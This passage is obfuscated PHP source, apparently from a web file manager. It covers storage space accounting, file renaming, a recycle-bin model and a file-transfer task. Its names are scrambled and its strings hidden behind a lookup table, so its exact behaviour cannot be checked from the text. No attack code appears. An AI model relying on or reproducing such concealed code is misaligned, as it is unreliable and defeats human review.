($›ç¸‡à» as $¨úå×¢Ÿ) { $¨úå×¢Ÿ = $¨úå×¢Ÿ . $­ú«èË[12]; if (!isset($¶ã„É»[$¨úå×¢Ÿ])) { continue; } if ($À‰©£Ë³[$­ú«èË[475]] == $¶ã„É»[$¨úå×¢Ÿ][$­ú«èË[475]]) { $¶ã„É»[$¨úå×¢Ÿ][$­ú«èË[78]] += $À‰©£Ë³[$­ú«èË[78]]; } } } $«Ûü Î = array(); foreach ($¶ã„É» as $À‰©£Ë³) { if ($À‰©£Ë³[$­ú«èË[78]] == $À‰©£Ë³[$­ú«èË[2205]]) { continue; } $«Ûü Î[] = array($­ú«èË[183], $À‰©£Ë³[$­ú«èË[183]], $­ú«èË[78], $À‰©£Ë³[$­ú«èË[78]]); } $this->saveAll($«Ûü Î); } public function userSpaceReset($µ‹¢á‘ø = false) { $¨ÍÕ¹¥ =& $_SERVER[èùÙ¹Ïö]; $şá¡ÊÓà = $this->where(array($¨ÍÕ¹¥[180] => self::TYPE_USER, $¨ÍÕ¹¥[541] => $µ‹¢á‘ø, $¨ÍÕ¹¥[455] => 0))->sum($¨ÍÕ¹¥[78]); $şá¡ÊÓà = !$şá¡ÊÓà || $şá¡ÊÓà <= 0 ? 0 : $şá¡ÊÓà; Model($¨ÍÕ¹¥[549])->userEdit($µ‹¢á‘ø, array($¨ÍÕ¹¥[1883] => $şá¡ÊÓà)); } public function targetSpaceUpdate($‹ØØâë©, $èÛ¢çÂ­) { $ÓÜÔ‚Ö =& $_SERVER[èùÙ¹Ïö]; if (!$èÛ¢çÂ­) { return; } if (!in_array($‹ØØâë©, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ĞéÕÁ = $this->targetSpaceSize($‹ØØâë©, $èÛ¢çÂ­); if ($‹ØØâë© == self::TYPE_USER) { Model($ÓÜÔ‚Ö[549])->userEdit($èÛ¢çÂ­, array($ÓÜÔ‚Ö[1883] => $ĞéÕÁ)); } else { if ($‹ØØâë© == self::TYPE_GROUP) { Model($ÓÜÔ‚Ö[557])->groupEdit($èÛ¢çÂ­, array($ÓÜÔ‚Ö[1883] => $ĞéÕÁ)); } } } public function targetSpaceSize($ŸØú° À, $ì—°‡ú) { $‰Œ¥òÑ› =& $_SERVER[èùÙ¹Ïö]; $Ë÷·²¾Ÿ = 0; $”²Ëú‹Ö = $this->targetSourceRoot($ŸØú° À, $ì—°‡ú, !0); foreach ($”²Ëú‹Ö as $±–ÍÁôè) { if (!$±–ÍÁôè) { continue; } $Ë÷·²¾Ÿ += floatval($±–ÍÁôè[$‰Œ¥òÑ›[78]]); $ú¿‚Â İ = array($‰Œ¥òÑ›[623] => array($‰Œ¥òÑ›[583], $‰Œ¥òÑ›[566] . $±–ÍÁôè[$‰Œ¥òÑ›[183]] . $‰Œ¥òÑ›[584])); $Ä£­éµé = Model($‰Œ¥òÑ›[473])->field($‰Œ¥òÑ›[461])->where($ú¿‚Â İ)->select(); $Ä£­éµé = array_to_keyvalue($Ä£­éµé, $‰Œ¥òÑ›[12], $‰Œ¥òÑ›[183]); $Ä£­éµé = array_unique(array_filter($Ä£­éµé)); if ($Ä£­éµé) { $ú¿‚Â İ = array($‰Œ¥òÑ›[461] => array($‰Œ¥òÑ›[462], $Ä£­éµé)); $Ë÷·²¾Ÿ += floatval($this->where($ú¿‚Â İ)->sum($‰Œ¥òÑ›[78])); } } $Ë÷·²¾Ÿ = !$Ë÷·²¾Ÿ || $Ë÷·²¾Ÿ <= 0 ? 0 : $Ë÷·²¾Ÿ; return $Ë÷·²¾Ÿ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($£ûú§›²) { return $this->fileTypeProfile($£ûú§›², SourceModel::TYPE_USER); } public function groupFileTypeProfile($³ôÃ©«ù) { return $this->fileTypeProfile($³ôÃ©«ù, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Ò‰‘œ‹Â, $Â»ÜÇØÇ) { $„õ¡…ş× =& $_SERVER[èùÙ¹Ïö]; $èèòÁ = $„õ¡…ş×[2206] . $Ò‰‘œ‹Â . $„õ¡…ş×[11] . $Â»ÜÇØÇ; $úÅ³³ÃŠ = Cache::get($èèòÁ); if ($úÅ³³ÃŠ) { return $úÅ³³ÃŠ; } $Ñ¨÷ñ£ = array($„õ¡…ş×[617] => 0); if ($Ò‰‘œ‹Â != !1) { $Ñ¨÷ñ£[$„õ¡…ş×[541]] = $Ò‰‘œ‹Â; $Ñ¨÷ñ£[$„õ¡…ş×[180]] = $Â»ÜÇØÇ; } $¿è„ùµ = array(); $¿è„ùµ[$„õ¡…ş×[2207]] = array($„õ¡…ş×[2208] => LNG($„õ¡…ş×[2207]), $„õ¡…ş×[2209] => $this->where($Ñ¨÷ñ£)->count(), $„õ¡…ş×[588] => $this->where($Ñ¨÷ñ£)->sum($„õ¡…ş×[78])); $õ×¤êˆğ = KodIO::fileTypeList(); foreach ($õ×¤êˆğ as $àß¶–ø‰ => $¿¿ğÙŠ©) { $Ñ¨÷ñ£[$„õ¡…ş×[456]] = $this->fileTypeWhere($àß¶–ø‰); $¿è„ùµ[$àß¶–ø‰] = array($„õ¡…ş×[2208] => $¿¿ğÙŠ©[$„õ¡…ş×[32]], $„õ¡…ş×[2209] => $this->where($Ñ¨÷ñ£)->count(), $„õ¡…ş×[588] => $this->where($Ñ¨÷ñ£)->sum($„õ¡…ş×[78])); } Cache::set($èèòÁ, $¿è„ùµ, 1200); return $¿è„ùµ; } public function fileNameExist($Ê¾ÎĞø, $Úò‡…ş) { $Èêœ˜­ =& $_SERVER[èùÙ¹Ïö]; $ÙÀ¤ı…¾ = $this->field($Èêœ˜­[2210])->where(array($Èêœ˜­[182] => $Ê¾ÎĞø, $Èêœ˜­[32] => $Úò‡…ş, $Èêœ˜­[475] => 0))->find(); return is_array($ÙÀ¤ı…¾) ? $ÙÀ¤ı…¾[$Èêœ˜­[183]] : !1; } public function childList($üµõ¥º²) { $Øïıôš¾ =& $_SERVER[èùÙ¹Ïö]; $›˜¬ñšÕ = $Øïıôš¾[2183] . $üµõ¥º²; if (isset(self::$cacheChildList[$›˜¬ñšÕ])) { return self::$cacheChildList[$›˜¬ñšÕ]; } $©Óİã = array($Øïıôš¾[182] => intval($üµõ¥º²), $Øïıôš¾[475] => 0); $·î¼Ã§ø = $this->where($©Óİã)->select(); $·î¼Ã§ø = $·î¼Ã§ø ? $·î¼Ã§ø : array(); self::$cacheChildList[$›˜¬ñšÕ] = $·î¼Ã§ø; foreach ($·î¼Ã§ø as $ôŸî×ãĞ) { $›˜¬ñšÕ = $Øïıôš¾[503] . $ôŸî×ãĞ[$Øïıôš¾[183]]; self::$cacheSourceInfo[$›˜¬ñšÕ] = $ôŸî×ãĞ; } return $·î¼Ã§ø; } public function fileNameAuto($ùùÊÙû‡, $Ñøûå¨í, $Çø©‚‡¼ = REPEAT_RENAME, $³¬é•òå = false) { $Ö¨àõ¥÷ =& $_SERVER[èùÙ¹Ïö]; $ªÈ•Âœà = get_path_ext($Ñøûå¨í); $À¹…ïÏ = $ªÈ•Âœà ? basename($Ñøûå¨í, $Ö¨àõ¥÷[10] . $ªÈ•Âœà) . $Ö¨àõ¥÷[2211] . $ªÈ•Âœà : $Ñøûå¨í . $Ö¨àõ¥÷[430]; $ÜõßŠ¡† = array($Ö¨àõ¥÷[182] => $ùùÊÙû‡, $Ö¨àõ¥÷[475] => 0, $Ö¨àõ¥÷[32] => array($Ö¨àõ¥÷[429], $À¹…ïÏ)); $ƒÎ®¹’© = $this->field($Ö¨àõ¥÷[32])->where($ÜõßŠ¡†)->select(); $İÔñäà = array_to_keyvalue($ƒÎ®¹’©, $Ö¨àõ¥÷[12], $Ö¨àõ¥÷[32]); return $this->fileNameAutoGet($İÔñäà, $Ñøûå¨í, $Çø©‚‡¼, $³¬é•òå); } public function fileNameAutoGet($­ø¸†ş, $§ø£æß, $’×ıÏ“×, $şªæÙí‰) { $‰±Áó†Ş =& $_SERVER[èùÙ¹Ïö]; if ($’×ıÏ“× == REPEAT_REPLACE || !$­ø¸†ş || !in_array_not_case($§ø£æß, $­ø¸†ş) || $şªæÙí‰ && $’×ıÏ“× != REPEAT_RENAME_FOLDER) { return $§ø£æß; } if ($’×ıÏ“× == REPEAT_SKIP) { return !1; } $áôøáŠİ = $‰±Áó†Ş[10] . get_path_ext($§ø£æß); $áôøáŠİ = $áôøáŠİ == $‰±Áó†Ş[10] || $şªæÙí‰ ? $‰±Áó†Ş[12] : $áôøáŠİ; for ($ı´¿èœƒ = 1; $ı´¿èœƒ <= count($­ø¸†ş) + 1; $ı´¿èœƒ++) { $€¶£­à” = substr($§ø£æß, 0, strlen($§ø£æß) - strlen($áôøáŠİ)); $ã­–‰ıÎ = $€¶£­à” . "\50{$ı´¿èœƒ}\x29{$áôøáŠİ}"; if (!in_array_not_case($ã­–‰ıÎ, $­ø¸†ş)) { return $ã­–‰ıÎ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\143\x65\137\162\x65\x63\171\143\x6c\145"; protected $dataAuto = array(array("\143\162\145\141\164\x65\x54\x69\155\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\x72\164", "\x66\x75\156\x63\x74\x69\157\156")); public function listData($¼¯ë–Ñ = false) { $‹öğÈÛ¬ =& $_SERVER[èùÙ¹Ïö]; $¼¯ë–Ñ = $¼¯ë–Ñ ? $¼¯ë–Ñ : USER_ID; $Ú¢áš½Ç = $this->where(array($‹öğÈÛ¬[1687] => $¼¯ë–Ñ))->select(); return array_to_keyvalue($Ú¢áš½Ç, $‹öğÈÛ¬[12], $‹öğÈÛ¬[183]); } public function moveToRecycle($å‘¤·¤Ñ) { $€Ò¡Ÿı¹ =& $_SERVER[èùÙ¹Ïö]; $îÂØ”ßï = Model($€Ò¡Ÿı¹[1381]); $·×áÕ† = $îÂØ”ßï->sourceInfo($å‘¤·¤Ñ); if (!$·×áÕ† || $·×áÕ†[$€Ò¡Ÿı¹[475]] == $€Ò¡Ÿı¹[90]) { return; } $óŠ³Îâµ = array($€Ò¡Ÿı¹[461] => $å‘¤·¤Ñ, $€Ò¡Ÿı¹[1687] => USER_ID, $€Ò¡Ÿı¹[619] => $·×áÕ†[$€Ò¡Ÿı¹[180]], $€Ò¡Ÿı¹[620] => $·×áÕ†[$€Ò¡Ÿı¹[541]], $€Ò¡Ÿı¹[623] => $·×áÕ†[$€Ò¡Ÿı¹[556]]); $this->add($óŠ³Îâµ); $this->recycleMove($å‘¤·¤Ñ, 1); if ($·×áÕ†[$€Ò¡Ÿı¹[455]] == $€Ò¡Ÿı¹[90]) { $¬”œ¥¥Â = array($€Ò¡Ÿı¹[623] => array($€Ò¡Ÿı¹[583], $·×áÕ†[$€Ò¡Ÿı¹[556]] . $å‘¤·¤Ñ . $€Ò¡Ÿı¹[584])); $îÂØ”ßï->where($¬”œ¥¥Â)->setField($€Ò¡Ÿı¹[475], 1); } } public function clear() { $this->remove(!1); } public function remove($õ¥òú§ = false, $™™š‚Ñ” = false) { $†ÙÌ‡ƒ½ =& $_SERVER[èùÙ¹Ïö]; $™™š‚Ñ” = $™™š‚Ñ” ? $™™š‚Ñ” : USER_ID; $Á¶ãëéÅ = Model($†ÙÌ‡ƒ½[1381]); $±ŠÈŒêö = $this->listData($™™š‚Ñ”); $õ¥òú§ = $õ¥òú§ === !1 ? !1 : $õ¥òú§; $í¢Üæ»İ = array(); foreach ($±ŠÈŒêö as $×¾¾ßÀÍ) { if ($õ¥òú§ != !1 && !in_array($×¾¾ßÀÍ, $õ¥òú§)) { continue; } $‚­´¿íã = $Á¶ãëéÅ->sourceInfo($×¾¾ßÀÍ); $Á¶ãëéÅ->remove($×¾¾ßÀÍ, !1); $©ùëÅ¥ = $‚­´¿íã[$†ÙÌ‡ƒ½[180]] . $†ÙÌ‡ƒ½[11] . $‚­´¿íã[$†ÙÌ‡ƒ½[541]]; $í¢Üæ»İ[$©ùëÅ¥] = array($†ÙÌ‡ƒ½[619] => $‚­´¿íã[$†ÙÌ‡ƒ½[180]], $†ÙÌ‡ƒ½[541] => $‚­´¿íã[$†ÙÌ‡ƒ½[541]]); $this->where(array($†ÙÌ‡ƒ½[183] => $×¾¾ßÀÍ))->delete(); } foreach ($í¢Üæ»İ as $ŒûĞ©¿) { $Á¶ãëéÅ->targetSpaceUpdate($ŒûĞ©¿[$†ÙÌ‡ƒ½[180]], $ŒûĞ©¿[$†ÙÌ‡ƒ½[541]]); } } public function restore($ÃÒ­Î– = false) { $£îçÜ¯• = $this->listData(); $this->_restoreSource($£îçÜ¯•, $ÃÒ­Î–); } public function removeUserAll($Š´ŞÃÈó) { $this->remove(!1, $Š´ŞÃÈó); } public function restoreItem($¤™Í£›À) { $this->_restoreSource(array($¤™Í£›À), array($¤™Í£›À)); } private function _restoreSource($Üã’æ‹Ú, $™á¡¬íù) { $™Ë†˜ê² =& $_SERVER[èùÙ¹Ïö]; $ƒğøƒ°Ê = Model($™Ë†˜ê²[1381]); $™á¡¬íù = $™á¡¬íù == !1 ? !1 : $™á¡¬íù; if (!$Üã’æ‹Ú) { return !0; } $ƒŒˆ†¦× = array(); foreach ($Üã’æ‹Ú as $ºâ™Ë¶³) { if ($™á¡¬íù != !1 && !in_array($ºâ™Ë¶³, $™á¡¬íù)) { continue; } $¸ÜÍŠ‹¬ = $ƒğøƒ°Ê->sourceInfo($ºâ™Ë¶³); $ƒ•Å …ñ = $ƒğøƒ°Ê->sourceInfo($¸ÜÍŠ‹¬[$™Ë†˜ê²[182]]); if ($ƒ•Å …ñ[$™Ë†˜ê²[475]] == $™Ë†˜ê²[90]) { continue; } $ƒğøƒ°Ê->lockMoveStart($ºâ™Ë¶³); $this->recycleMove($ºâ™Ë¶³, 0); if ($¸ÜÍŠ‹¬[$™Ë†˜ê²[455]] == $™Ë†˜ê²[90]) { $æ÷ÆìÄŒ = array($™Ë†˜ê²[623] => array($™Ë†˜ê²[583], $¸ÜÍŠ‹¬[$™Ë†˜ê²[556]] . $ºâ™Ë¶³ . $™Ë†˜ê²[584])); $ƒğøƒ°Ê->where($æ÷ÆìÄŒ)->setField($™Ë†˜ê²[475], 0); $this->restoreFolderChildren($ºâ™Ë¶³, $Üã’æ‹Ú); } $this->where(array($™Ë†˜ê²[183] => $ºâ™Ë¶³))->delete(); $ƒğøƒ°Ê->folderSizeReset($¸ÜÍŠ‹¬[$™Ë†˜ê²[182]]); $ƒŒˆ†¦×[] = $¸ÜÍŠ‹¬[$™Ë†˜ê²[182]]; if ($¸ÜÍŠ‹¬[$™Ë†˜ê²[455]] == $™Ë†˜ê²[90]) { $ƒŒˆ†¦×[] = $ºâ™Ë¶³; } $ƒğøƒ°Ê->lockMoveEnd($ºâ™Ë¶³); } $ƒğøƒ°Ê->updateModifyTime($ƒŒˆ†¦×); } private function restoreFolderChildren($€¾÷½Ñ, $ ¤øı¯¤) { $®´Ó”éÄ =& $_SERVER[èùÙ¹Ïö]; $ÎÒ«¦İò = Model($®´Ó”éÄ[1381]); $ß×‰Ÿ¸à = array($®´Ó”éÄ[183] => array($®´Ó”éÄ[7], array())); foreach ($ ¤øı¯¤ as $š÷ù€Ï) { if ($š÷ù€Ï == $€¾÷½Ñ) { continue; } if (!$ÎÒ«¦İò->isParentOf($€¾÷½Ñ, $š÷ù€Ï)) { continue; } $Š¯÷¼ïÚ = $ÎÒ«¦İò->sourceInfo($š÷ù€Ï); if ($Š¯÷¼ïÚ[$®´Ó”éÄ[455]] == $®´Ó”éÄ[90]) { $ß×‰Ÿ¸à[] = array($®´Ó”éÄ[623] => array($®´Ó”éÄ[583], $Š¯÷¼ïÚ[$®´Ó”éÄ[556]] . $š÷ù€Ï . $®´Ó”éÄ[584])); } else { $ß×‰Ÿ¸à[$®´Ó”éÄ[183]][1][] = $š÷ù€Ï; } } if (!$ß×‰Ÿ¸à[$®´Ó”éÄ[183]][1]) { unset($ß×‰Ÿ¸à[$®´Ó”éÄ[183]]); } if (!$ß×‰Ÿ¸à) { return; } if (is_array($ß×‰Ÿ¸à[$®´Ó”éÄ[183]]) && is_array($ß×‰Ÿ¸à[$®´Ó”éÄ[183]][1])) { $ß×‰Ÿ¸à[$®´Ó”éÄ[183]][1] = array_unique($ß×‰Ÿ¸à[$®´Ó”éÄ[183]][1]); } $ß×‰Ÿ¸à[$®´Ó”éÄ[1046]] = $®´Ó”éÄ[1992]; $ÎÒ«¦İò->where($ß×‰Ÿ¸à)->setField($®´Ó”éÄ[475], 1); } private function recycleMove($ƒ—©†Ã, $äö­¡‘© = 1) { $«®Ö¨› =& $_SERVER[èùÙ¹Ïö]; $˜û¿ó”ê = Model($«®Ö¨›[1381]); $°´£æÇ‚ = Model($«®Ö¨›[2212]); $ìÛ¿äµè = array($«®Ö¨›[183] => $ƒ—©†Ã); if ($äö­¡‘©) { $˜û¿ó”ê->where($ìÛ¿äµè)->setField($«®Ö¨›[475], 1); $°´£æÇ‚->eventRecycle($ƒ—©†Ã, $«®Ö¨›[2213]); } else { $ù±ÎÁš = $˜û¿ó”ê->where($ìÛ¿äµè)->find(); $”×¯“•Å = $ù±ÎÁš[$«®Ö¨›[455]] == $«®Ö¨›[90]; $¿§åäÕˆ = $˜û¿ó”ê->fileNameAuto($ù±ÎÁš[$«®Ö¨›[182]], $ù±ÎÁš[$«®Ö¨›[32]], REPEAT_RENAME_FOLDER, $”×¯“•Å); if ($¿§åäÕˆ != $ù±ÎÁš[$«®Ö¨›[32]]) { $˜û¿ó”ê->rename($ƒ—©†Ã, $¿§åäÕˆ); } $˜û¿ó”ê->where($ìÛ¿äµè)->setField($«®Ö¨›[475], 0); $°´£æÇ‚->eventRecycle($ƒ—©†Ã, $«®Ö¨›[2214]); } } } goto aù†ç‹åš; C©î†ã­Øë: class TaskFileTransfer extends Task { protected function startAfter() { $ó©¢ú²¶ =& $_SERVER[èùÙ¹Ïö]; $•æ® Ë =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ó©¢ú²¶[1726], array($this, $ó©¢ú²¶[1727])); Hook::bind($ó©¢ú²¶[1271], array($this, $ó©¢ú²¶[1728])); Hook::bind($ó©¢ú²¶[1729], array($this, $ó©¢ú²¶[1730])); Hook::bind($ó©¢ú²¶[639], array($this, $ó©¢ú²¶[1731])); Hook::bind($ó©¢ú²¶[640], array($this, $ó©¢ú²¶[1732])); Hook::bind($ó©¢ú²¶[646], array($this, $ó©¢ú²¶[1733])); Hook::bind($ó©¢ú²¶[647], array($this, $ó©¢ú²¶[1734])); Hook::bind($ó©¢ú²¶[642], array($this, $ó©¢ú²¶[1735])); Hook::bind($ó©¢ú²¶[644], array($this, $ó©¢ú²¶[1736])); Hook::bind($ó©¢ú²¶[608], array($this, $ó©¢ú²¶[1737])); Hook::bind($ó©¢ú²¶[605], array($this, $ó©¢ú²¶[1737])); Hook::bind($ó©¢ú²¶[610], array($this, $ó©¢ú²¶[1737])); Hook::bind($ó©¢ú²¶[612], array($this, $ó©¢ú²¶[1737])); Hook::bind($ó©¢ú²¶[614], array($this, $ó©¢ú²¶[1737])); Hook::bind($ó©¢ú²¶[1738], array($this, $ó©¢ú²¶[1739])); Hook::bind($ó©¢ú²¶[630], array($this, $ó©¢ú²¶[1740])); $this->sourceModelCopyFlag = !1; Hook::bind($ó©¢ú²¶[1741], array($this, $ó©¢ú²¶[1742])); Hook::bind($ó©¢ú²¶[1743], array($this, $ó©¢ú²¶[1744])); Hook::bind($ó©¢ú²¶[1745], array($this, $ó©¢ú²¶[1746])); $•æ® Ë[$ó©¢ú²¶[1747]] = LNG($ó©¢ú²¶[1748]); $•æ® Ë[$ó©¢ú²¶[1749]] = 0; $•æ® Ë[$ó©¢ú²¶[1750]] = 0; $•æ® Ë[$ó©¢ú²¶[1110]] = $ó©¢ú²¶[12]; $•æ® Ë[$ó©¢ú²¶[1751]] = $ó©¢ú²¶[12]; $•æ® Ë[$ó©¢ú²¶[1752]] = 0; $•æ® Ë[$ó©¢ú²¶[1753]] = 0; $•æ® Ë[$ó©¢ú²¶[1754]] = 0; if (!$•æ® Ë[$ó©¢ú²¶[1592]]) { $•æ® Ë[$ó©¢ú²¶[1592]] = LNG($ó©¢ú²¶[1755]); } } protected function endAfter() { $ÙÁƒÅ‹ô =& $_SERVER[èùÙ¹Ïö]; Hook::unbind($ÙÁƒÅ‹ô[1726], array($this, $ÙÁƒÅ‹ô[1727])); Hook::unbind($ÙÁƒÅ‹ô[1271], array($this, $ÙÁƒÅ‹ô[1728])); Hook::unbind($ÙÁƒÅ‹ô[1729], array($this, $ÙÁƒÅ‹ô[1730])); Hook::unbind($ÙÁƒÅ‹ô[639], array($this, $ÙÁƒÅ‹ô[1731])); Hook::unbind($ÙÁƒÅ‹ô[640], array($this, $ÙÁƒÅ‹ô[1732])); Hook::unbind($ÙÁƒÅ‹ô[646], array($this, $ÙÁƒÅ‹ô[1733])); Hook::unbind($ÙÁƒÅ‹ô[647], array($this, $ÙÁƒÅ‹ô[1734])); Hook::unbind($ÙÁƒÅ‹ô[642], array($this, $ÙÁƒÅ‹ô[1735])); Hook::unbind($ÙÁƒÅ‹ô[644], array($this, $ÙÁƒÅ‹ô[1736])); Hook::unbind($ÙÁƒÅ‹ô[608], array($this, $ÙÁƒÅ‹ô[1737])); Hook::unbind($ÙÁƒÅ‹ô[605], array($this, $ÙÁƒÅ‹ô[1737])); Hook::unbind($ÙÁƒÅ‹ô[610], array($this, $ÙÁƒÅ‹ô[1737])); Hook::unbind($ÙÁƒÅ‹ô[612], array($this, $ÙÁƒÅ‹ô[1737])); Hook::unbind($ÙÁƒÅ‹ô[614], array($this, $ÙÁƒÅ‹ô[1737])); Hook::unbind($ÙÁƒÅ‹ô[1738], array($this, $ÙÁƒÅ‹ô[1739])); Hook::unbind($ÙÁƒÅ‹ô[630], array($this, $ÙÁƒÅ‹ô[1740])); Hook::unbind($ÙÁƒÅ‹ô[1741], array($this, $ÙÁƒÅ‹ô[1742])); Hook::unbind($ÙÁƒÅ‹ô[1743], array($this, $ÙÁƒÅ‹ô[1744])); Hook::unbind($ÙÁƒÅ‹ô[1745], array($this, $ÙÁƒÅ‹ô[1746])); } public function copyMoveStart($‘ßÔû¿„, $î¾ç³œ¡, $¢Ñóˆ•š, $ññíåê) { $ßûÑ™©Ï =& $_SERVER[èùÙ¹Ïö]; self::log($ßûÑ™©Ï[1756] . $î¾ç³œ¡ . $ßûÑ™©Ï[72] . $ññíåê); $‹¦¼ÉôŠ = rtrim(TEMP_FILES, $ßûÑ™©Ï[8]); if (substr($î¾ç³œ¡, 0, strlen($‹¦¼ÉôŠ)) == $‹¦¼ÉôŠ) { return; } if (substr($ññíåê, 0, strlen($‹¦¼ÉôŠ)) == $‹¦¼ÉôŠ) { return; } $”°µ­£Ü =& $this->task; $”°µ­£Ü[$ßûÑ™©Ï[1757]] = KodIO::transferType($‘ßÔû¿„, $¢Ñóˆ•š); $this->update(); } public function updateAfter() { $Äˆ˜ƒ’ =& $_SERVER[èùÙ¹Ïö]; $òòĞï› =& $this->task; if (!$òòĞï›[$Äˆ˜ƒ’[803]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($òòĞï›[$Äˆ˜ƒ’[1757]] == $Äˆ˜ƒ’[1363]) { return; } self::updateTask($òòĞï›); } private static function updateTask(&$¦õÏùÆ•) { $ÒëäŸ»ü =& $_SERVER[èùÙ¹Ïö]; if ($¦õÏùÆ•[$ÒëäŸ»ü[1757]] == $ÒëäŸ»ü[1242] || $¦õÏùÆ•[$ÒëäŸ»ü[1757]] == $ÒëäŸ»ü[109]) { if ($¦õÏùÆ•[$ÒëäŸ»ü[1751]]) { $¦õÏùÆ•[$ÒëäŸ»ü[1754]] = $¦õÏùÆ•[$ÒëäŸ»ü[1753]] + $¦õÏùÆ•[$ÒëäŸ»ü[1750]]; } } else { if ($¦õÏùÆ•[$ÒëäŸ»ü[1757]] == $ÒëäŸ»ü[1364]) { if ($¦õÏùÆ•[$ÒëäŸ»ü[1751]] == $ÒëäŸ»ü[1242]) { $¦õÏùÆ•[$ÒëäŸ»ü[1754]] = $¦õÏùÆ•[$ÒëäŸ»ü[1753]] + $¦õÏùÆ•[$ÒëäŸ»ü[1750]] * 0.5; } else { if ($¦õÏùÆ•[$ÒëäŸ»ü[1751]] == $ÒëäŸ»ü[109]) { $¦õÏùÆ•[$ÒëäŸ»ü[1754]] = $¦õÏùÆ•[$ÒëäŸ»ü[1753]] + $¦õÏùÆ•[$ÒëäŸ»ü[1749]] * 0.5 + $¦õÏùÆ•[$ÒëäŸ»ü[1750]] * 0.5; } } } } $¦õÏùÆ•[$ÒëäŸ»ü[1698]] = $¦õÏùÆ•[$ÒëäŸ»ü[1754]] / $¦õÏùÆ•[$ÒëäŸ»ü[803]]; if ($¦õÏùÆ•[$ÒëäŸ»ü[1698]] > 0) { $ ë˜ğ·¨ = timeFloat() - $¦õÏùÆ•[$ÒëäŸ»ü[1700]] - $¦õÏùÆ•[$ÒëäŸ»ü[1703]]; $¦õÏùÆ•[$ÒëäŸ»ü[1704]] = $ ë˜ğ·¨ * (1 - $¦õÏùÆ•[$ÒëäŸ»ü[1698]]) / $¦õÏùÆ•[$ÒëäŸ»ü[1698]]; } } public function addPath($ÁãŒÖô) { $åĞÌ¢Ì¶ =& $_SERVER[èùÙ¹Ïö]; if (!$ÁãŒÖô) { return; } $¶¨Ü¶Ÿ =& $this->task; $×Šš–Ê = IO::infoWithChildren($ÁãŒÖô); $—¿¹øÀ‡ = $¶¨Ü¶Ÿ[$åĞÌ¢Ì¶[1758]] ? $¶¨Ü¶Ÿ[$åĞÌ¢Ì¶[1758]][$åĞÌ¢Ì¶[1759]] : 0; $¶¨Ü¶Ÿ[$åĞÌ¢Ì¶[1758]] = array($åĞÌ¢Ì¶[1759] => $—¿¹øÀ‡ + 1, $åĞÌ¢Ì¶[464] => $×Šš–Ê[$åĞÌ¢Ì¶[32]], $åĞÌ¢Ì¶[86] => $×Šš–Ê[$åĞÌ¢Ì¶[86]], $åĞÌ¢Ì¶[554] => $×Šš–Ê[$åĞÌ¢Ì¶[554]] ? $×Šš–Ê[$åĞÌ¢Ì¶[554]] : $×Šš–Ê[$åĞÌ¢Ì¶[86]]); if ($×Šš–Ê[$åĞÌ¢Ì¶[33]] == $åĞÌ¢Ì¶[216]) { $¶¨Ü¶Ÿ[$åĞÌ¢Ì¶[826]] += 1; } else { $¶¨Ü¶Ÿ[$åĞÌ¢Ì¶[826]] += $×Šš–Ê[$åĞÌ¢Ì¶[81]][$åĞÌ¢Ì¶[79]]; if ($×Šš–Ê[$åĞÌ¢Ì¶[183]]) { $¶¨Ü¶Ÿ[$åĞÌ¢Ì¶[826]] += $×Šš–Ê[$åĞÌ¢Ì¶[81]][$åĞÌ¢Ì¶[80]] + 1; } } $¶¨Ü¶Ÿ[$åĞÌ¢Ì¶[803]] += $×Šš–Ê[$åĞÌ¢Ì¶[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ìºâş©) { } public function sourceAddHashEnd($Ÿìß íÍ) { } public function sourceAddFileStart($¯ó¢çû•) { $²’İû²€ =& $_SERVER[èùÙ¹Ïö]; $îµ¹Âˆï =& $this->task; $îµ¹Âˆï[$²’İû²€[1749]] = $¯ó¢çû•[$²’İû²€[78]]; $îµ¹Âˆï[$²’İû²€[1747]] = $¯ó¢çû•[$²’İû²€[32]]; $îµ¹Âˆï[$²’İû²€[1110]] = $¯ó¢çû•[$²’İû²€[32]]; $îµ¹Âˆï[$²’İû²€[1760]] = $¯ó¢çû•[$²’İû²€[86]]; $this->update(); } public function sourceAddFileEnd($áŸ¤ÂÕ) { $¿´Ìíˆò =& $_SERVER[èùÙ¹Ïö]; $ëïïÁ‡Ë =& $this->task; $ëïïÁ‡Ë[$¿´Ìíˆò[1754]] += $áŸ¤ÂÕ[$¿´Ìíˆò[78]]; $ëïïÁ‡Ë[$¿´Ìíˆò[1760]] = $áŸ¤ÂÕ[$¿´Ìíˆò[86]]; $this->update(1); } public function copyFileStart($Ê–ÛÂ¥Ğ, $ãùúÖ£ª, $ÀÕÒ®Ó£, $…ˆí‡›, $›Ğíü¬¶, $Ó”Ÿıå•) { $­Î›´»÷ =& $_SERVER[èùÙ¹Ïö]; $ÄîíÇ€ª = $›Ğíü¬¶; if ($ÄîíÇ€ª == $GLOBALS[$­Î›´»÷[1761]]) { $ÄîíÇ€ª = $GLOBALS[$­Î›´»÷[1762]]; } $GLOBALS[$­Î›´»÷[1762]] = $›Ğíü¬¶; $GLOBALS[$­Î›´»÷[1761]] = $Ó”Ÿıå•; $ÓÄ÷ş =& $this->task; $ÓÄ÷ş[$­Î›´»÷[1747]] = $ÄîíÇ€ª; $ÓÄ÷ş[$­Î›´»÷[1749]] = (int) $Ê–ÛÂ¥Ğ->size($ãùúÖ£ª); $ÓÄ÷ş[$­Î›´»÷[1750]] = 0; $ÓÄ÷ş[$­Î›´»÷[1110]] = $­Î›´»÷[12]; $ÓÄ÷ş[$­Î›´»÷[1751]] = $­Î›´»÷[12]; $ÓÄ÷ş[$­Î›´»÷[1752]] = 0; $´ºœÄõ¸ = $ÓÄ÷ş[$­Î›´»÷[1749]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÓÄ÷ş[$­Î›´»÷[445]] . $­Î›´»÷[1763]); if ($´ºœÄõ¸ && file_exists(get_path_father($…ˆí‡›))) { Cache::set($ÓÄ÷ş[$­Î›´»÷[445]] . $­Î›´»÷[1763], $…ˆí‡›); $ÓÄ÷ş[$­Î›´»÷[1720]] = array($­Î›´»÷[1764], 